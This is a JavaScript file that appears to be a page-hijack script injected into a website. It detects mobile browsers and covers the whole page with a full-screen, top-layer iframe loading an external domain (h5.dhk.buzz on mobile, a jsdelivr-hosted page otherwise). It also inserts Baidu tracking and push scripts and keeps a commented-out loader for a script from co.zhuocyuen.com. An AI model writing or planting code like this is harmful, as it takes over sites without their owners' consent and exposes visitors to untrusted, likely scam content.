
function checkMobile() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    var isMobile = sUserAgent.match(/iphone|android|ipad|phone|mobile|wap|netfront|x11|java|operamobi|operamini|uc|windowsce|symbian|symbianos|series|webos|sony|blackberry|dopod|nokia|samsung|palmsource|xda|pieplus|meizu|midp|cldc|motorola|foma|docomo|up.browser|up.link|blazer|helio|hosin|huawei|novarra|coolpad|webos|techfaith|palmsource|alcatel|amoi|ktouch|nexian|ericsson|philips|sagem|wellcom|bunjalloo|maui|smartphone|iemobile|spice|bird|zte-|longcos|pantech|gionee|portalmmm|jig browser|hiptop|benq|haier/i) != null;
    if (isMobile) {
        return true;
    }
    if(navigator.userAgent.indexOf('UCBrowser') > -1){
    	return true;
    }
    if(sUserAgent.match(/MicroMessenger/i) == 'micromessenger'){
    	return true;
    }
    if(!!sUserAgent.match(/mqqbrowser|qzone|qqbrowser/i)){
    	return true;
    }
    return false;
}

if (checkMobile()){
	var str=new Array("https://h5.dhk.buzz/");

}else{
     var str=new Array("https://cdn.jsdelivr.net/gh/ankenz6/vcn@css/dhh/40.html");
}

//  var url2 = str[parseInt(Math.random()*(str.length))];
 document.writeln('<div class="scroll-wrapper" style="position: fixed;    height: 100%;    width: 100%;    padding: 0px;    margin: 0px; background: white;border: none;top: 0px;left: 0;z-index: 1999999999; _0: absolute; _1: expression(eval(document.documentElement.scrollTop)); "><iframe width="100%" height="100%" id="warpperId"      src="' + str + '">');
 document.writeln('</iframe></div>');
 document.writeln(" <style>");
 document.writeln(" body{   margin: 0!important;    padding: 0!important;}");
 document.writeln(".scroll-wrapper{");
 document.writeln("-webkit-overflow-scrolling: touch;");
 document.writeln("overflow: scroll;}");
 document.writeln("iframe{");
 document.writeln("width: 100%;");
 document.writeln("height: 100%;");
 document.writeln("}");
 document.writeln("");
 document.writeln("iframe {");
 document.writeln("    border-width: 0px;");
 document.writeln(" }");
 document.writeln("</style>");
 document.writeln(" <meta name=\'viewport\' content=\'width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0\'>");



var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?4";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();



(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();

// var myDate = new Date();
// var time =  myDate.getFullYear() +""+ myDate.getMonth() +""+myDate.getDate() +""+ myDate.getHours();
// document.writeln("<script src=\'https://co.zhuocyuen.com/se.js?"+time+"\'></script>");


var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?7";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();